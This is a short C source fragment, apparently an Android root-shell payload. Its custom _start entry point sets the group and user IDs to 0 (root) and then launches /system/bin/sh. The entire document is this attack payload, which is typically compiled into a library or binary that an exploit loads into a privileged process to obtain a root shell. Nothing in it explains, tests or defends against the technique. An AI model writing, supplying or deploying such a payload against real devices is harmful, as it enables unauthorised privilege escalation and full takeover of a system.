void _start()
{
	setresgid(0, 0, 0);
	setresuid(0, 0, 0);
	system("/system/bin/sh");
}
